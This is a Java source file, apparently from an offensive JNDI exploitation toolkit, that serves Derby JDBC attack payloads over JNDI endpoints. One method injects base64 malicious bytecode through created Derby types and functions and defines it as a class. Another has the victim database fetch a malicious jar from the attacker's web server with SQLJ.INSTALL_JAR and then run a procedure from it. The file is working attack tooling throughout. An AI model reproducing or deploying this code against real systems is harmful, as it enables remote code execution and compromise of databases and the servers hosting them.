package cn.butler.jndi.controller.database;

import cn.butler.jndi.JndiConfig;
import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.JarHandle.JarPayload;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.controller.DatabaseController;
import cn.butler.jndi.server.WebServer;
import cn.butler.jndi.util.MiscUtil;

import java.util.*;

/**
 * 有些JDBC攻击方式需要统一一下
 */
public class SingleSQLController extends DatabaseController {
    private static HashMap<String,String> injectHashMap = new HashMap<>();
    private static HashMap<String,String> installRemotehashMap = new HashMap<>();

    private static void derbyInjectSQLStructure(String className,String base64ByteCode){
        injectHashMap.clear();
        injectHashMap.put("TypeClass",String.format("create type %sClass external name 'java.lang.Class' language java",className));
        injectHashMap.put("TypeObject",String.format("create type %sObject external name 'java.lang.Object' language java",className));
        injectHashMap.put("TypeClassLoader",String.format("create type %sClassLoader external name 'java.lang.ClassLoader' language java",className));
        injectHashMap.put("FunBase64",String.format("create function %s64Decode(className VARCHAR(32672)) returns VARCHAR(32672) FOR BIT DATA external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java",className));
        injectHashMap.put("FunClassLoader",String.format("create function get%smClassLoader() returns %sClassLoader external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java",className,className));
        injectHashMap.put("FunDefineClass",String.format("create function de%sClass(className VARCHAR(32672),bytes VARCHAR(32672) FOR BIT DATA,loader %sClassLoader) returns %sClass external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)' language java parameter style java",className,className,className));
        injectHashMap.put("CreateTable",String.format("create table inje%sct(v %sClass)",className,className));
        injectHashMap.put("Insert",String.format("insert into inje%sct values (de%sClass('%s', %s64Decode('%s'), get%smClassLoader()))",className,className,className,className,base64ByteCode,className));
    }

    private static void derbyRemoteJarSQLStructure(String className,String staticMethodName){
        installRemotehashMap.clear();
        installRemotehashMap.put("Install",String.format("CALL SQLJ.INSTALL_JAR('%s.jar', 'APP.%s', 0)",JndiConfig.codebase + className,className));
        installRemotehashMap.put("AddClassPath",String.format("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP.%s')",className));
        installRemotehashMap.put("CreateProcedure",String.format("CREATE PROCEDURE %s() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '%s.%s'",staticMethodName,className,staticMethodName));
        installRemotehashMap.put("CallProcedure",String.format("CALL %s()",staticMethodName));
    }

    @JNDIMapping("/Derby/Install/Remote/Single/{database}/{explot}/{impact}")
    public Properties derbyInstallRemote(String database,String explot,String impact) throws Exception {
        System.out.println("[Derby] [Install Remote] Database Impact: " + explot + ":" + impact);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        //生成漏洞利用效果的字节码
        String effect = explot+":"+impact;
        Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
        //给字节码创建个随机的静态方法
        String staticMethodName = MiscUtil.getRandStr(5);
        objects = (Object[]) ClassHandleUtil.modifyCustomStaticMethodClass((String) objects[0],(byte[]) objects[1],staticMethodName);
        String className = (String) objects[0];
        byte[] byteCode = (byte[]) objects[1];
        //部署远程jar包
        byte[] jarBytes = JarPayload.create(className, byteCode);
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);
        //获取SQL语句
        derbyRemoteJarSQLStructure(className,staticMethodName);
        String sql = installRemotehashMap.get("Install");

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);
        return props;
    }

    @JNDIMapping("/Derby/Install/Remote/SingleSQL/{database}/{sqlType}")
    public Properties derbyInstallRemoteSQL(String database,String sqlType) throws Exception {
        System.out.println("[Derby] [Install Remote] Database SQL: " + sqlType);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        //获取SQL语句
        String sql = installRemotehashMap.get(sqlType);

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);
        return props;
    }

    @JNDIMapping("/Derby/Inject/Single/{database}/{explot}/{impact}")
    public Properties derbyInject(String database,String explot,String impact) {
        System.out.println("[Derby] [Inject] Database Impact: " + explot + ":" + impact);

        //通过ThirdPartyAttack模块制作恶意的字节码
        String url = "jdbc:derby:memory:" + database + ";create=true";
        String effect = explot+":"+impact;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
        String className = (String) objects[0];
        byte[] byteCode = (byte[]) objects[1];
        String base64ByteCode = Base64.getEncoder().encodeToString(byteCode);
        //获取SQL语句
        derbyInjectSQLStructure(className,base64ByteCode);
        String sql = injectHashMap.get("TypeClass");

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);
        return props;
    }

    @JNDIMapping("/Derby/Inject/SingleSQL/{database}/{sqlType}")
    public Properties derbyInjectSQL(String database,String sqlType) throws Exception {
        System.out.println("[Derby] [Inject] Database SQL: " + sqlType);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        //获取SQL语句
        String sql = injectHashMap.get(sqlType);

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);
        return props;
    }
}
